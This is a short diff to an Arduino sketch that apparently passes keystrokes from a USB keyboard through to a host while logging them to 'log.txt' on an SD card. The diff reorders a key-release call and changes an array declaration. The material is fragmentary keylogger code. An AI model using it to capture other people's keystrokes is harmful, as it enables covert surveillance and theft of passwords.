@@ -15,7 +15,7 @@
 #define SHIFT   (0x80)
 #define ALTGR   (0x40)
 
-extern const uint8_t _asciimap[256] PROGMEM;
+extern const uint8_t _asciimap[] PROGMEM;
 
 //modifiers
 int leftctrl_status=0;
@@ -62,9 +62,9 @@ class KbdRptParser : public KeyboardReportParser {
 };
 
 void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
-  Keyboard.rawrelease(key, 0);
   SetModifiersArd();
   key_modifier = key|modifiersard,HEX;
+  Keyboard.rawrelease(key, 0);
   SDlog = SD.open("log.txt", FILE_WRITE);
 
   for (int i = 0; i < 256; i++) {
